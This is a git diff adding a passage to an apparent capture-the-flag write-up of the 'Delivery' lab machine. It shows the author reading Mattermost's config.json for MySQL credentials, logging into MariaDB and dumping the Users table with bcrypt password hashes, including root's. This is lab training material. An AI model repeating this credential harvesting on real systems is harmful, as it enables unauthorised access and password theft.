@@ -58,3 +58,51 @@ Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
 maildeliverer@Delivery:~$ ls
 user.txt
 ```
+Mattermost stores its configuration files in `/opt/mattermost/config/config.json`. This file contains SQL database credentials.
+```
+    "SqlSettings": {
+        "DriverName": "mysql",
+        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readT$
+        "DataSourceReplicas": [],
+        "DataSourceSearchReplicas": [],
+        "MaxIdleConns": 20,
+        "ConnMaxLifetimeMilliseconds": 3600000,
+        "MaxOpenConns": 300,
+        "Trace": false,
+        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
+        "QueryTimeout": 30,
+        "DisableDatabaseSearch": false
+    }
+```
+`mmuser:Crack_The_MM_Admin_PW` --- used these credentials to log in to mysql.
+```
+mysql -u mmuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 38
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+```
+Found the mattermost database; found the root credentials under the Users table.
+```
+MariaDB [mattermost]> select id, Username, Password from Users;
++----------------------------+----------------------------------+--------------------------------------------------------------+
+| id                         | Username                         | Password                                                     |
++----------------------------+----------------------------------+--------------------------------------------------------------+
+| 64nq8nue7pyhpgwm99a949mwya | surveybot                        |                                                              |
+| 6akd5cxuhfgrbny81nj55au4za | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 6wkx1ggn63r7f8q1hpzp7t4iiy | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| dijg7mcf4tf3xrgxi5ntqdefma | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| hatotzdacb8mbe95hm4ei8i7ny | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| jing8rk6mjdbudcidw6wz94rdy | channelexport                    |                                                              |
+| n9magehhzincig4mm97xyft9sc | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
++----------------------------+----------------------------------+--------------------------------------------------------------+
+```
+```
+dijg7mcf4tf3xrgxi5ntqdefma | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+```
